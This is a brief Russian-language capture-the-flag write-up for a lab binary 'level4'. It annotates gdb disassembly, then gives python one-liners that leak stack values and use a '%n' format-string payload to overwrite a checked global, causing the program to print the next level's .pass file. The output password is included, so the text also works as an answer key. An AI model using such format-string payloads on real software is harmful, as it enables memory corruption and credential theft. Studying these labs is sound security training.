
# Вызов функции 'fgets', защищенной от переполнения буфера
=> 0x804847a <n+35>:	call   0x8048350 <fgets@plt>

# Можно увидеть вызов 'printf' с тем что мы ввели
=> 0x8048450 <p+12>:	call   0x8048340 <printf@plt>

# сmp создается с неинициализированной переменной
0x804848d <n+54>:	mov    eax,ds:0x8049810
=> 0x8048492 <n+59>:	cmp    eax,0x1025544
# если проверка прошла успешно, то файл '.pass' печатается с помощью 'system ("/ bin / cat /home/user/level5/.pass")'

# Мы будем использовать атаку форматной строки
# Сначала нам нужно распечатать память, пока мы не дойдем до адреса переменной, которую хотим изменить
$> python -c "print '\x10\x98\x04\x08' + '%x '*12" | ./level4
b7ff26b0 bffff804 b7fd0ff4 0 0 bffff7c8 804848d bffff5c0 200 b7fd1ac0 b7ff37d0 8049810

# Затем мы используем модификатор %n, чтобы изменить содержимое этой переменной
$> python -c "print '\x10\x98\x04\x08' + '%16930112x%12\$n'" | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
